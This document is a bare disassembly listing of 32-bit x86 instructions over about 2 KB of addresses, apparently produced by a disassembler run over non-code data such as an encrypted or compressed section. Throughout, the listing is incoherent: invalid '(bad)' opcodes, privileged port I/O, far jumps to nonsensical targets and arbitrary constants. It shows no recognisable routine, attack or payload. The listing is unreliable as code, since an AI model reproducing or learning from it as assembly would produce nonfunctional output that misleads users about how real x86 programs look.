  411a11:	adc    BYTE PTR [ebx-0x53],bh
  411a14:	pusha  
  411a15:	mov    edx,0xe06e3145
  411a1a:	cmp    DWORD PTR [eax],edx
  411a1c:	adc    eax,0x8dccadec
  411a21:	push   ds
  411a22:	std    
  411a23:	repz sbb BYTE PTR [ecx+0x7d],dl
  411a27:	mov    BYTE PTR [ecx+0x5e5386cf],ah
  411a2d:	jle    0x411a75
  411a2f:	in     al,dx
  411a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a31:	rcr    BYTE PTR [edi-0x15a0a385],1
  411a37:	mov    bh,0x7b
  411a39:	and    ax,0x48
  411a3d:	int3   
  411a3e:	pop    es
  411a3f:	jno    0x411a61
  411a41:	xchg   BYTE PTR [edx+edx*2],dh
  411a44:	or     al,0x51
  411a46:	ror    BYTE PTR [ecx+0xb49a3ca],0x6b
  411a4d:	sbb    BYTE PTR [edx-0x10],dh
  411a50:	shl    esp,1
  411a52:	addr16 mov bl,0x8e
  411a55:	mov    ch,BYTE PTR [ebp+esi*8-0x62509189]
  411a5c:	jnp    0x4119ea
  411a5e:	jp     0x411a71
  411a60:	int3   
  411a61:	aaa    
  411a62:	adc    BYTE PTR [ebx-0x24e2ad07],0x1b
  411a69:	jecxz  0x411aae
  411a6b:	inc    edi
  411a6c:	mov    bh,0x5c
  411a6e:	fist   DWORD PTR [esi+0x24]
  411a71:	lods   eax,DWORD PTR ds:[esi]
  411a72:	shl    bl,1
  411a74:	aad    0x1d
  411a76:	cwde   
  411a77:	mov    al,0x6f
  411a79:	daa    
  411a7a:	arpl   WORD PTR [esp+ebp*8],di
  411a7d:	mov    dh,0x71
  411a7f:	pop    esp
  411a80:	aas    
  411a81:	sub    BYTE PTR [ebx+edi*4-0x2282a68e],0xeb
  411a89:	jne    0x411ab6
  411a8b:	repnz div BYTE PTR [ebx-0x52af0858]
  411a92:	rcr    esi,0x70
  411a95:	(bad)  
  411a96:	jge    0x411a85
  411a98:	adc    al,0x2a
  411a9a:	jns    0x411ad4
  411a9c:	in     eax,dx
  411a9d:	and    al,BYTE PTR [ebp+0x53]
  411aa0:	jnp    0x411aa1
  411aa2:	and    eax,0xa122a7f4
  411aa7:	xlat   BYTE PTR ds:[ebx]
  411aa8:	lock xor eax,esi
  411aab:	lds    esi,FWORD PTR [ebp-0x5dd17b1]
  411ab1:	mov    al,0x29
  411ab3:	or     edi,0x20c2e546
  411ab9:	mov    ah,0x7a
  411abb:	mov    cl,0xf3
  411abd:	sbb    dh,al
  411abf:	sub    esp,DWORD PTR [ecx-0x2d]
  411ac2:	pop    eax
  411ac3:	(bad)  
  411ac4:	xchg   esi,ecx
  411ac6:	(bad)  
  411ac7:	fild   WORD PTR [ebp+0x77821fd0]
  411acd:	mov    ah,0xb6
  411acf:	push   ebx
  411ad0:	mov    bl,0x84
  411ad2:	xor    bl,BYTE PTR ds:0x2e30aae1
  411ad8:	push   edi
  411ad9:	inc    ecx
  411ada:	lock inc ebx
  411adc:	or     BYTE PTR ds:0x3b66c999,0x3d
  411ae3:	pop    ecx
  411ae4:	dec    edi
  411ae5:	fbld   TBYTE PTR [ebx+edx*8+0x61]
  411ae9:	fimul  DWORD PTR [ecx-0x34873323]
  411aef:	adc    al,0x2e
  411af1:	lea    edx,[ebx-0x69]
  411af4:	stc    
  411af5:	mov    dl,0x77
  411af7:	push   0x87bc32e9
  411afc:	nop
  411afd:	retf   0xa8aa
  411b00:	cmp    eax,ebp
  411b02:	fcomp  DWORD PTR ss:[edx-0x50]
  411b06:	pop    es
  411b07:	mov    edi,0x5bfb137b
  411b0c:	pop    ecx
  411b0d:	sti    
  411b0e:	sbb    BYTE PTR [ebx-0x3a],0x12
  411b12:	fwait
  411b13:	int    0x75
  411b15:	pop    ecx
  411b16:	in     eax,dx
  411b17:	gs sahf 
  411b19:	(bad)  
  411b1a:	jnp    0x411b24
  411b1c:	xchg   ecx,edx
  411b1e:	add    eax,0xc06aace4
  411b23:	inc    esi
  411b24:	(bad)  
  411b25:	icebp  
  411b26:	mov    DWORD PTR [edi+0x2596b0e],esi
  411b2c:	in     eax,0x69
  411b2e:	add    bl,BYTE PTR [ebx]
  411b30:	stos   DWORD PTR es:[edi],eax
  411b31:	in     eax,0xdf
  411b33:	loopne 0x411b8b
  411b35:	push   0x10
  411b37:	dec    ebx
  411b38:	cs dec edi
  411b3a:	test   al,0x7e
  411b3c:	into   
  411b3d:	lea    ecx,[esi]
  411b3f:	jae    0x411ac1
  411b41:	inc    edx
  411b42:	leave  
  411b43:	sub    al,0xf5
  411b45:	or     eax,DWORD PTR [ebp+0x7a]
  411b48:	jle    0x411b45
  411b4a:	inc    ebp
  411b4b:	inc    ebx
  411b4c:	jmp    0x411bb3
  411b4e:	in     eax,dx
  411b4f:	ret    0xde5f
  411b52:	lock aaa 
  411b54:	test   eax,0x34ed7091
  411b59:	js     0x411b37
  411b5b:	push   esi
  411b5c:	ins    BYTE PTR es:[edi],dx
  411b5d:	lods   al,BYTE PTR ds:[esi]
  411b5e:	(bad)  
  411b5f:	xchg   edx,eax
  411b60:	js     0x411b56
  411b62:	je     0x411b33
  411b64:	xchg   ebx,eax
  411b65:	dec    edi
  411b66:	aam    0x4a
  411b68:	pusha  
  411b69:	dec    esi
  411b6a:	push   0xd49aa08f
  411b6f:	add    esp,DWORD PTR [edi]
  411b71:	xchg   ecx,eax
  411b72:	int    0x7d
  411b74:	pop    ds
  411b75:	mov    dl,0xb3
  411b77:	mov    ebx,0xac8c7d4d
  411b7c:	lods   eax,DWORD PTR ds:[esi]
  411b7d:	and    DWORD PTR [edi-0x4fbe281],ebx
  411b83:	push   ecx
  411b84:	jbe    0x411bbb
  411b86:	outs   dx,BYTE PTR ds:[esi]
  411b87:	pop    ds
  411b88:	in     eax,dx
  411b89:	sbb    eax,0x5dfebea6
  411b8e:	ficom  DWORD PTR [ecx+ebx*1-0x32]
  411b92:	outs   dx,BYTE PTR ds:[esi]
  411b93:	repz loope 0x411ba7
  411b96:	inc    ecx
  411b97:	jg     0x411bf7
  411b99:	sub    al,0xe2
  411b9b:	aam    0x18
  411b9d:	into   
  411b9e:	push   edx
  411b9f:	pop    esi
  411ba0:	mov    eax,DWORD PTR [ecx-0xd]
  411ba3:	fs mov ah,0xb3
  411ba6:	test   bh,dl
  411ba8:	ins    BYTE PTR es:[edi],dx
  411ba9:	div    BYTE PTR [esi-0x16]
  411bac:	fnstsw WORD PTR [edi+0xc]
  411baf:	pushf  
  411bb0:	push   0xffffffbd
  411bb2:	jns    0x411be3
  411bb4:	push   eax
  411bb5:	lahf   
  411bb6:	pop    edi
  411bb7:	push   0x1b39ab5d
  411bbc:	int    0x49
  411bbe:	push   cs
  411bbf:	outs   dx,BYTE PTR ds:[esi]
  411bc0:	neg    DWORD PTR [edx+0x3d07aeeb]
  411bc6:	inc    ecx
  411bc7:	sub    eax,0x4a9ccdf4
  411bcc:	(bad)  
  411bcd:	jp     0x411c38
  411bcf:	inc    BYTE PTR [ebx-0x36fc042]
  411bd5:	or     ebx,DWORD PTR [ebx-0x3f996dc3]
  411bdb:	inc    ebp
  411bdc:	cmp    eax,esp
  411bde:	je     0x411c4b
  411be0:	adc    dl,BYTE PTR [edx+0x30]
  411be3:	xchg   ebp,eax
  411be4:	jmp    0x9a8d:0x3c526be5
  411beb:	shl    BYTE PTR [ebp+0x3],1
  411bee:	pop    ds
  411bef:	fld    TBYTE PTR [ecx]
  411bf1:	xlat   BYTE PTR ds:[ebx]
  411bf2:	scas   eax,DWORD PTR es:[edi]
  411bf3:	dec    ecx
  411bf4:	sub    al,0xc
  411bf6:	shr    DWORD PTR [ebx-0x35],0x90
  411bfa:	pop    es
  411bfb:	stc    
  411bfc:	jecxz  0x411bcd
  411bfe:	mov    cl,0x51
  411c00:	xchg   esp,eax
  411c01:	and    eax,0x6d782b85
  411c06:	rcr    BYTE PTR [ecx+0x40],cl
  411c09:	cmp    ch,dh
  411c0b:	mov    ebx,0xe972a56e
  411c10:	retf   0x2c28
  411c13:	mov    ss,ecx
  411c15:	adc    ah,BYTE PTR [ebx-0x2fa3bdc8]
  411c1b:	pushf  
  411c1c:	test   BYTE PTR ds:0x21c4ea5d,cl
  411c22:	sbb    al,0x5c
  411c24:	sbb    al,0xac
  411c26:	fild   DWORD PTR [eax]
  411c28:	gs xchg esi,eax
  411c2a:	pop    es
  411c2b:	sbb    BYTE PTR [ecx+0x277d87c1],bl
  411c31:	loope  0x411bd7
  411c33:	lods   al,BYTE PTR ds:[esi]
  411c34:	jp     0x411bef
  411c36:	adc    dh,BYTE PTR [ebp-0x21f4e5f0]
  411c3c:	iret   
  411c3d:	push   esi
  411c3e:	sar    BYTE PTR [edx-0x61],1
  411c41:	push   cs
  411c42:	mov    eax,ds:0xaebe2a5e
  411c47:	xor    ch,ah
  411c49:	out    0x52,eax
  411c4b:	in     al,dx
  411c4c:	out    0xa1,eax
  411c4e:	push   esp
  411c4f:	scas   eax,DWORD PTR es:[edi]
  411c50:	push   edx
  411c51:	(bad)  
  411c52:	not    BYTE PTR [ebp+0x79]
  411c55:	jns    0x411c39
  411c57:	add    al,0xdd
  411c59:	push   0x32b6a8a2
  411c5e:	or     BYTE PTR [edi+0x4f529865],bh
  411c64:	xor    DWORD PTR [ebx+0x5f378f65],0xffffff8d
  411c6b:	pusha  
  411c6c:	pop    edx
  411c6d:	mov    dl,ch
  411c6f:	sbb    ah,dl
  411c71:	sub    eax,0xf459a8e3
  411c76:	adc    esp,DWORD PTR [edx-0x58942180]
  411c7c:	push   0x3fc9830
  411c81:	icebp  
  411c82:	rcr    DWORD PTR [ecx-0x25],0x27
  411c86:	mov    bh,0xf4
  411c88:	mov    ebx,0x7d4beb3d
  411c8d:	or     al,0x66
  411c8f:	mov    BYTE PTR ss:[ebp+0x54730d43],ch
  411c96:	sub    al,0x6e
  411c98:	bound  esp,QWORD PTR [ebp-0x63]
  411c9b:	cmp    DWORD PTR [eax],edi
  411c9d:	scas   eax,DWORD PTR es:[edi]
  411c9e:	cdq    
  411c9f:	outs   dx,DWORD PTR ds:[esi]
  411ca0:	inc    BYTE PTR [edx+0x57]
  411ca3:	out    0x70,eax
  411ca5:	stos   DWORD PTR es:[edi],eax
  411ca6:	popf   
  411ca7:	dec    esp
  411ca8:	sbb    edx,DWORD PTR [ebx-0x7a]
  411cab:	(bad)  [edi+0x3b299d0a]
  411cb1:	call   0xea52:0xa835734f
  411cb8:	xchg   esi,eax
  411cb9:	test   al,0xbe
  411cbb:	jp     0x411d22
  411cbd:	mov    ebp,0x23341c62
  411cc2:	jmp    0x411c9c
  411cc4:	pop    ss
  411cc5:	push   esp
  411cc6:	jecxz  0x411d20
  411cc8:	mov    al,0xb5
  411cca:	add    bh,0xe6
  411ccd:	pop    ss
  411cce:	push   es
  411ccf:	push   eax
  411cd0:	pop    edx
  411cd1:	out    dx,eax
  411cd2:	mov    dl,0x76
  411cd4:	push   cs
  411cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cd6:	jecxz  0x411c61
  411cd8:	dec    esp
  411cd9:	inc    ecx
  411cda:	jg     0x411c8c
  411cdc:	leave  
  411cdd:	and    DWORD PTR [edx+esi*2-0x6f37ea94],ecx
  411ce4:	adc    BYTE PTR [ebp+0x719bca26],dl
  411cea:	cld    
  411ceb:	jno    0x411d4f
  411ced:	adc    dl,BYTE PTR [edi]
  411cef:	(bad)
  411cf2:	std    
  411cf3:	and    eax,0x73105dc8
  411cf8:	jp     0x411cf4
  411cfa:	mov    ebp,DWORD PTR [edi-0x1cc6593a]
  411d00:	(bad)  
  411d01:	(bad)  
  411d02:	cmp    eax,0xe3c9ae5b
  411d07:	repz fimul WORD PTR [edi-0x7d]
  411d0b:	test   BYTE PTR [eax-0x45da10ba],0x92
  411d12:	xlat   BYTE PTR ds:[ebx]
  411d13:	into   
  411d14:	stos   BYTE PTR es:[edi],al
  411d15:	mov    edi,0x4633c934
  411d1a:	xchg   edx,eax
  411d1b:	out    0xc3,al
  411d1d:	push   cs
  411d1e:	inc    ecx
  411d1f:	stc    
  411d20:	dec    esp
  411d21:	mov    ebx,0x6bb3eeb7
  411d26:	cld    
  411d27:	ss (bad) 
  411d29:	push   ecx
  411d2a:	pop    ebp
  411d2b:	pushf  
  411d2c:	xor    BYTE PTR [edx],ch
  411d2e:	inc    esi
  411d2f:	xchg   edi,eax
  411d30:	pop    ss
  411d31:	cli    
  411d32:	stc    
  411d33:	ins    BYTE PTR es:[edi],dx
  411d34:	jmp    FWORD PTR [ebx-0x3d]
  411d37:	jno    0x411d22
  411d39:	pop    esi
  411d3a:	pop    ecx
  411d3b:	out    dx,al
  411d3c:	addr16 out 0x2f,al
  411d3f:	push   0x45
  411d41:	and    BYTE PTR [edx-0x31b42bb4],ah
  411d47:	shl    al,cl
  411d49:	mov    ebx,0xc8334fb6
  411d4e:	and    dh,BYTE PTR [ecx+0x5]
  411d51:	xchg   DWORD PTR [eax],ecx
  411d53:	loopne 0x411d2b
  411d55:	fcomp  st(3)
  411d57:	pop    eax
  411d58:	inc    ebx
  411d59:	jb     0x411d1c
  411d5b:	xor    ebx,DWORD PTR [edi-0x304a34be]
  411d61:	out    dx,al
  411d62:	mov    esi,0x717dbac6
  411d67:	fidiv  DWORD PTR [ecx]
  411d69:	sbb    dl,dl
  411d6b:	ja     0x411cee
  411d6d:	cdq    
  411d6e:	push   ebx
  411d6f:	fdivr  QWORD PTR [ebx]
  411d71:	xor    al,0x9e
  411d73:	imul   eax,DWORD PTR [ebx],0xda78b1c6
  411d79:	in     al,dx
  411d7a:	fcomp  QWORD PTR [ecx-0x619aa4b7]
  411d80:	in     eax,dx
  411d81:	clc    
  411d82:	pop    esi
  411d83:	push   0x7dcc5c3f
  411d88:	adc    ah,BYTE PTR [eax-0x6e]
  411d8b:	bound  ebp,QWORD PTR [ebx]
  411d8d:	jnp    0x411d21
  411d8f:	sub    bh,BYTE PTR [eax+0x17e0d1eb]
  411d95:	aaa    
  411d96:	repnz mov ch,ch
  411d99:	fwait
  411d9a:	push   ds
  411d9b:	jno    0x411e11
  411d9d:	or     al,0xc5
  411d9f:	jg     0x411dcc
  411da1:	push   es
  411da2:	cmp    edx,DWORD PTR ds:0x7ddd21ab
  411da8:	aad    0x69
  411daa:	test   al,0x9c
  411dac:	mov    bh,0xc6
  411dae:	pop    esp
  411daf:	inc    ecx
  411db0:	in     al,dx
  411db1:	std    
  411db2:	es scas eax,DWORD PTR es:[edi]
  411db4:	(bad)  
  411db5:	mov    ah,BYTE PTR [eax]
  411db7:	mov    dh,0xa9
  411db9:	mul    bh
  411dbb:	xor    ch,cl
  411dbd:	push   esp
  411dbe:	push   edi
  411dbf:	xchg   esp,eax
  411dc0:	add    cl,BYTE PTR [edi]
  411dc2:	daa    
  411dc3:	dec    ecx
  411dc4:	jle    0x411dc9
  411dc6:	and    ebx,DWORD PTR [edx-0x36981839]
  411dcc:	das    
  411dcd:	mov    dl,0xd
  411dcf:	mov    bl,0xeb
  411dd1:	push   ebp
  411dd2:	iret   
  411dd3:	popf   
  411dd4:	int3   
  411dd5:	out    dx,al
  411dd6:	jo     0x411d91
  411dd8:	out    dx,eax
  411dd9:	jbe    0x411dcf
  411ddb:	push   ebp
  411ddc:	test   BYTE PTR [ebx+0x17],0x10
  411de0:	and    eax,0xf83c1945
  411de5:	xor    BYTE PTR [ecx],0x2c
  411de8:	outs   dx,DWORD PTR ds:[esi]
  411de9:	xchg   edi,eax
  411dea:	sbb    al,BYTE PTR [esi]
  411dec:	div    BYTE PTR [edi]
  411dee:	movaps XMMWORD PTR [ebp-0x2f8ce996],xmm0
  411df5:	mov    dl,0x24
  411df7:	ret    
  411df8:	fistp  WORD PTR [esi-0x43]
  411dfb:	jmp    0x8fbf:0x59d4bf38
  411e02:	push   ebx
  411e03:	xchg   edx,eax
  411e04:	mov    al,0x1c
  411e06:	pop    es
  411e07:	hlt    
  411e08:	pop    edi
  411e09:	push   esp
  411e0a:	fidivr DWORD PTR [edi+0xb8db866]
  411e10:	nop
  411e11:	popa   
  411e12:	jle    0x411db9
  411e14:	jbe    0x411dd9
  411e16:	rol    DWORD PTR [ebx],1
  411e18:	cdq    
  411e19:	dec    ebx
  411e1a:	push   0xffffff86
  411e1c:	cli    
  411e1d:	cmp    DWORD PTR [eax-0x16],0x3d
  411e21:	stos   BYTE PTR es:[edi],al
  411e22:	jmp    0xe3a6:0x3c9a5b5d
  411e29:	inc    ecx
  411e2a:	xor    DWORD PTR [edx],edi
  411e2c:	lea    edx,[bx+di]
  411e2f:	push   0xffffffce
  411e31:	xor    DWORD PTR [ebx-0x7f],eax
  411e34:	inc    edx
  411e35:	mov    bl,0xd7
  411e37:	adc    ecx,DWORD PTR [eax+0x39530cf7]
  411e3d:	gs adc bl,dl
  411e40:	hlt    
  411e41:	ret    0xde88
  411e44:	test   al,0x27
  411e46:	jg     0x411e1d
  411e48:	aaa    
  411e49:	test   DWORD PTR [esi-0x7a],0x3173f26f
  411e50:	in     al,0x5c
  411e52:	mov    bh,0xa0
  411e54:	stos   BYTE PTR es:[edi],al
  411e55:	scas   al,BYTE PTR es:[edi]
  411e56:	dec    eax
  411e57:	ds aaa 
  411e59:	repnz cmp eax,0xe9365469
  411e5f:	dec    esp
  411e60:	clc    
  411e61:	sbb    esi,DWORD PTR [ebx]
  411e63:	dec    esi
  411e64:	sbb    ecx,DWORD PTR [edx-0x69856d40]
  411e6a:	mov    ah,0xab
  411e6c:	enter  0x4d57,0x5
  411e70:	xchg   ecx,eax
  411e71:	(bad)  
  411e72:	xchg   edx,eax
  411e73:	clc    
  411e74:	cwde   
  411e75:	in     al,0x1d
  411e77:	(bad)  
  411e79:	inc    ebx
  411e7a:	sbb    dh,BYTE PTR [ecx]
  411e7c:	xchg   cl,dl
  411e7e:	bound  esi,QWORD PTR [eax+0xa063632]
  411e84:	and    edx,DWORD PTR [ebp+0x3e7bd8e7]
  411e8a:	mov    ah,0xbb
  411e8c:	dec    eax
  411e8d:	test   al,0xeb
  411e8f:	mov    ds:0xb000a7df,al
  411e94:	shr    BYTE PTR [edx],1
  411e96:	inc    eax
  411e97:	iret   
  411e98:	xor    DWORD PTR [edx-0xc810e5c],ebx
  411e9e:	cmp    BYTE PTR [eax],0x28
  411ea1:	out    dx,eax
  411ea2:	mov    ebx,cs
  411ea4:	sar    DWORD PTR [edi+eiz*2],1
  411ea7:	pop    ds
  411ea8:	and    BYTE PTR ds:0x6b75c33a,ch
  411eae:	mov    bl,0x55
  411eb0:	ror    BYTE PTR [esi],1
  411eb2:	into   
  411eb3:	test   al,0xb7
  411eb5:	push   esp
  411eb6:	push   edx
  411eb7:	jno    0x411f33
  411eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411eba:	in     eax,0x17
  411ebc:	jp     0x411ee8
  411ebe:	dec    eax
  411ebf:	test   BYTE PTR [edi+ecx*4],dl
  411ec2:	adc    bl,BYTE PTR [eax-0x744a391d]
  411ec8:	jo     0x411ed0
  411eca:	push   ss
  411ecb:	xlat   BYTE PTR ds:[ebx]
  411ecc:	in     al,dx
  411ecd:	cld    
  411ece:	push   ds
  411ecf:	cmp    eax,0x3ceae551
  411ed4:	idiv   DWORD PTR [edi-0x6b]
  411ed7:	adc    DWORD PTR [ebx-0x65],edi
  411eda:	xchg   ebx,eax
  411edb:	jle    0x411f21
  411edd:	imul   edi,eax,0xffffffb2
  411ee0:	loop   0x411e87
  411ee2:	sbb    eax,DWORD PTR [ecx+0x77]
  411ee5:	bound  edi,QWORD PTR [ebx]
  411ee7:	fiadd  WORD PTR [ebx-0x42]
  411eea:	inc    esi
  411eeb:	xor    esp,DWORD PTR [ebx]
  411eed:	cmp    cl,ah
  411eef:	sub    edx,DWORD PTR [esi+ebp*8-0x11]
  411ef3:	sbb    edx,DWORD PTR [eax]
  411ef5:	rdpmc  
  411ef7:	out    dx,eax
  411ef8:	jle    0x411e84
  411efa:	jae    0x411e9f
  411efc:	ret    
  411efd:	pop    edx
  411efe:	sbb    esp,DWORD PTR [ebp-0x77]
  411f01:	nop
  411f02:	or     al,0x8c
  411f04:	xchg   BYTE PTR [edx-0x75],cl
  411f07:	cmc    
  411f08:	inc    ecx
  411f09:	daa    
  411f0a:	cmp    eax,0x3007b0a1
  411f0f:	jl     0x411f55
  411f11:	mov    WORD PTR [eax],ds
  411f13:	bound  esi,QWORD PTR [ecx]
  411f15:	cmp    al,0x0
  411f17:	mov    WORD PTR cs:[edi],cs
  411f1a:	sar    BYTE PTR [esi-0x15],0xfa
  411f1e:	lds    edi,FWORD PTR [eax]
  411f20:	jnp    0x411ea9
  411f22:	jl     0x411f38
  411f24:	test   al,0xe7
  411f26:	fs call 0x52b8:0x3a252777
  411f2e:	jne    0x411f10
  411f30:	mov    esi,DWORD PTR [esi]
  411f32:	mov    edi,0x79aeb096
  411f37:	popf   
  411f38:	fucom  st(2)
  411f3a:	mov    bh,0xe4
  411f3c:	pop    ecx
  411f3d:	sbb    al,0x3b
  411f3f:	fmul   DWORD PTR [eax+0x1e]
  411f42:	ins    DWORD PTR es:[edi],dx
  411f43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f44:	and    al,BYTE PTR [ecx+edi*4-0x54849c5b]
  411f4b:	inc    ecx
  411f4c:	pop    esi
  411f4d:	arpl   bx,bp
  411f4f:	hlt    
  411f50:	mov    ecx,0x12abc3ed
  411f55:	(bad)  
  411f56:	sub    esp,DWORD PTR [esp+ecx*4]
  411f59:	nop
  411f5a:	ret    0x362c
  411f5d:	je     0x411f5b
  411f5f:	gs jge 0x411f9f
  411f62:	xchg   ecx,eax
  411f63:	xchg   esp,eax
  411f64:	xchg   ebp,eax
  411f65:	adc    esp,DWORD PTR [edi-0x4758d591]
  411f6b:	or     eax,0xcf4bab8d
  411f70:	inc    esi
  411f71:	loope  0x411f05
  411f73:	ins    DWORD PTR es:[edi],dx
  411f74:	sbb    eax,0x7e7bb797
  411f79:	mov    es,WORD PTR [edi]
  411f7b:	int    0x42
  411f7d:	add    al,0xeb
  411f7f:	stos   DWORD PTR es:[edi],eax
  411f80:	inc    esp
  411f81:	lods   eax,DWORD PTR ds:[esi]
  411f82:	push   eax
  411f83:	retf   0xc95d
  411f86:	cdq    
  411f87:	repnz dec ebx
  411f89:	aam    0x51
  411f8b:	cdq    
  411f8c:	into   
  411f8d:	arpl   WORD PTR [ebp+0x6251cfc6],bp
  411f93:	fs push ecx
  411f95:	xchg   ecx,eax
  411f96:	out    0x37,eax
  411f98:	inc    edi
  411f99:	dec    ebp
  411f9a:	jecxz  0x411f20
  411f9c:	loopne 0x411f61
  411f9e:	mov    DWORD PTR [ebx],0x64627b07
  411fa4:	or     edx,esi
  411fa6:	add    eax,DWORD PTR [edi]
  411fa8:	push   0x67
  411faa:	scas   al,BYTE PTR es:[edi]
  411fab:	(bad)  
  411fac:	(bad)  [ebp-0xf]
  411faf:	loope  0x411f72
  411fb1:	ins    BYTE PTR es:[edi],dx
  411fb2:	or     al,ch
  411fb4:	lea    esp,ds:0xaa2bf888
  411fba:	outs   dx,DWORD PTR ds:[esi]
  411fbb:	add    BYTE PTR [eax-0x72],bh
  411fbe:	daa    
  411fbf:	sbb    al,0x6c
  411fc1:	mov    edx,0x168a0154
  411fc6:	sbb    ch,al
  411fc8:	shl    al,0x81
  411fcb:	(bad)
  411fce:	and    DWORD PTR [edi+0x2c],eax
  411fd1:	daa    
  411fd2:	fcom   DWORD PTR [ebx+0x5f]
  411fd5:	xchg   ebp,eax
  411fd6:	test   DWORD PTR [ebx],0x22ca16a9
  411fdc:	pop    edx
  411fdd:	lods   eax,DWORD PTR ds:[esi]
  411fde:	pop    es
  411fdf:	mov    bh,0xe8
  411fe1:	jp     0x412058
  411fe3:	adc    eax,0x49698417
  411fe8:	ds mov ebp,esp
  411feb:	xchg   esi,eax
  411fec:	adc    eax,eax
  411fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fef:	sbb    DWORD PTR [edi],0x8cc3372a
  411ff5:	in     al,dx
  411ff6:	fcmovnb st,st(5)
  411ff8:	sar    BYTE PTR [esp+eiz*8-0x44],0x4f
  411ffd:	in     al,0x16
  411fff:	jns    0x411fea
  412001:	add    al,0x74
  412003:	xor    eax,DWORD PTR [edi]
  412005:	push   esi
  412006:	test   BYTE PTR [esp+eiz*2+0x51],bl
  41200a:	xchg   ebp,eax
  41200b:	adc    al,0x11
  41200d:	arpl   WORD PTR [ebp-0x4],si
  412010:	ror    BYTE PTR [edx+edx*1+0x32],1
  412014:	xchg   ebx,eax
  412015:	jnp    0x411f9a
  412017:	inc    esi
  412018:	mov    ch,0x96
  41201a:	xchg   DWORD PTR [eax+0x40260704],esp
  412020:	mov    bh,0xb3
  412022:	sti    
  412023:	imul   esp,DWORD PTR [edx],0xffffffa6
  412026:	xor    al,BYTE PTR [esp+eax*2-0x67]
  41202a:	jg     0x411fac
  41202c:	clc    
  41202d:	lds    eax,FWORD PTR [edx]
  41202f:	scas   eax,DWORD PTR es:[edi]
  412030:	lea    ecx,[ebp+0x45f78dce]
  412036:	jo     0x411fef
  412038:	cmp    ebx,DWORD PTR [edx+0x5f]
  41203b:	lock ins BYTE PTR es:[edi],dx
  41203d:	out    0xf9,eax
  41203f:	mov    al,BYTE PTR [esi-0x76218ea9]
  412045:	rcr    DWORD PTR [ebp+0x63],0x41
  412049:	adc    DWORD PTR [edx-0x61a21c9c],0xda3e5a39
  412053:	mov    DWORD PTR [ecx-0x47],esp
  412056:	gs pusha 
  412058:	out    dx,al
  412059:	aam    0x7d
  41205b:	es push eax
  41205d:	pop    edi
  41205e:	popf   
  41205f:	inc    ebx
  412060:	dec    edi
  412061:	je     0x412023
  412063:	je     0x41201e
  412065:	scas   al,BYTE PTR es:[edi]
  412066:	hlt    
  412067:	pop    ebx
  412068:	add    eax,0x99264de3
  41206d:	push   0x32
  41206f:	ss loop 0x4120c1
  412072:	stos   DWORD PTR es:[edi],eax
  412073:	jbe    0x412027
  412075:	push   cs
  412076:	lds    edi,FWORD PTR [esi+0x10]
  412079:	fld    DWORD PTR [ecx+ebp*4]
  41207c:	and    BYTE PTR [edx],dh
  41207e:	pop    es
  41207f:	xor    ebx,eax
  412081:	xor    bh,BYTE PTR [eax]
  412083:	aaa    
  412084:	test   DWORD PTR [edx-0x75983f8f],0x7676ba97
  41208e:	ret    
  41208f:	sbb    al,0x43
  412091:	mov    ebx,0x6bfcfedb
  412096:	arpl   WORD PTR [ebx],cx
  412098:	jb     0x4120c2
  41209a:	mov    esp,0xf8c396c7
  41209f:	jbe    0x41208a
  4120a1:	xor    BYTE PTR [esi-0xf374bc9],0x58
  4120a8:	daa    
  4120a9:	cld    
  4120aa:	push   0xc8c99be4
  4120af:	push   esp
  4120b0:	mov    dh,0x4
  4120b2:	cwde   
  4120b3:	and    bl,BYTE PTR [eax+edx*4-0x7fb97d3c]
  4120ba:	aas    
  4120bb:	pop    di
  4120bd:	call   DWORD PTR [ebp-0x5aa749a5]
  4120c3:	mov    ch,0x89
  4120c5:	adc    DWORD PTR [esi-0x1923d7f8],ecx
  4120cb:	out    dx,eax
  4120cc:	in     eax,0x48
  4120ce:	jnp    0x4120d6
  4120d0:	test   DWORD PTR [ebp-0xb553b1c],esp
  4120d6:	cdq    
  4120d7:	or     ebx,esp
  4120d9:	xchg   ebx,eax
  4120da:	jge    0x41205e
  4120dc:	dec    esp
  4120dd:	cmp    dh,BYTE PTR [eax-0xed25c5d]
  4120e3:	pop    ds
  4120e4:	mov    DWORD PTR ds:0xe7c55135,edi
  4120ea:	imul   ebx,DWORD PTR [eax+ecx*1+0x6c],0xf233e3b3
  4120f2:	int3   
  4120f3:	xor    edx,ebx
  4120f5:	gs mov al,0xcb
  4120f8:	sbb    al,0x3b
  4120fa:	test   BYTE PTR [ebp+0xd],dh
  4120fd:	rcl    DWORD PTR [edx-0x33d507ee],cl
  412103:	jbe    0x412167
  412105:	push   0xffffff8c
  412107:	add    cl,dl
  412109:	and    eax,0xa6c04421
  41210e:	cmp    ah,BYTE PTR [edi+0xfb87d56]
  412114:	pop    ebx
  412115:	jmp    0xd048:0xb2dd75c6
  41211c:	call   0xd8880468
  412121:	mov    dl,0x47
  412123:	or     ebx,DWORD PTR [edi+0x58]
  412126:	gs fdivr st,st(5)
  412129:	push   eax
  41212a:	jle    0x4121a4
  41212c:	stc    
  41212d:	mov    esp,0xd7a755e0
  412132:	push   ebp
  412133:	xchg   ax,ax
  412135:	es cmp dl,0x4f
  412139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41213a:	fldenv [esi+0x52]
  41213d:	loopne 0x412164
  41213f:	call   0xaab8:0x7f9581c1
  412146:	jmp    0xdfb9f726
  41214b:	xor    DWORD PTR [eax],ebp
  41214d:	icebp  
  41214e:	xchg   edi,eax
  41214f:	jae    0x412123
  412151:	call   0xdd1a895b
  412156:	lahf   
  412157:	cld    
  412158:	adc    ch,BYTE PTR fs:[edi]
  41215b:	je     0x41219f
  41215d:	push   ds
  41215e:	mov    ds:0xe712fc3d,al
  412163:	fdivrp st(5),st
  412165:	mov    bh,0xac
  412167:	aam    0x96
  412169:	out    0xc,al
  41216b:	adc    DWORD PTR [eax+eiz*8+0x68],ebp
  41216f:	jb     0x412102
  412171:	jbe    0x412158
  412173:	sbb    ebx,ebp
  412175:	sub    DWORD PTR [edx-0x49594956],esp
  41217b:	imul   edx,DWORD PTR [esi-0x7d],0x3817290d
  412182:	push   cs
  412183:	mov    cl,0xd4
  412185:	daa    
  412186:	mov    al,0xc5
  412188:	xor    al,0xb3
  41218a:	xchg   ecx,eax
  41218b:	and    bl,dh
